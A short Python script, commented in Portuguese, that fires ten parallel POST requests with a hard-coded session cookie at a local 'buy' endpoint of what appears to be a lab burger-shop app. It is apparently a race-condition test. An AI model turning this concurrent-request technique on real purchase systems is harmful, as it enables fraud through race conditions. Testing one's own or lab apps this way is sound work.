import requests
from concurrent.futures import ThreadPoolExecutor

# URL do endpoint de compra
url = "http://localhost:5000/buy/1"  # Exemplo: comprando o burger com id 1 (Hambúrguer de Siri)

# Payload para a requisição POST (substitua pelos dados necessários)
payload = {
    # Adicione aqui os dados necessários para a requisição
}

# Cabeçalhos da requisição
headers = {
    "Content-Type": "application/json"
}

# Cookie de sessão (substitua pelo valor real do cookie de sessão)
session_cookie = {
    "session": ".eJwljktqAzEQRO-itRdSfyS1LzO0-kOCIYEZe2V89wiyq1dUwXuXI8-4vsr9eb7iVo5vL_fCgqGJYSKkY8nwxSO1sjQMSrFow3n2ZoY4pKMDh7Vm3L0ryQIQSnLUUecEspqJ3jQ6iDBtZnSusP-uVrV1R-4VWHbYg7JFXlec_zaw0a4zj-fvI3520QNXFxg0ctGA1FgrLQl0miqDtQnKc5bPH8fLPys.ZnnfqA.H74NPAbS9VAkINVoBcww_jQvDbY"
}

def send_purchase_request(session):
    try:
        response = session.post(url, json=payload, headers=headers)
        print(f"Status Code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Erro ao enviar requisição: {e}")

def main():
    num_requests = 10  # Número de requisições a serem enviadas em paralelo
    with ThreadPoolExecutor(max_workers=num_requests) as executor:
        # Cria uma sessão e define o cookie de sessão
        session = requests.Session()
        session.cookies.update(session_cookie)
        
        futures = [executor.submit(send_purchase_request, session) for _ in range(num_requests)]
        for future in futures:
            future.result()

if __name__ == "__main__":
    main()
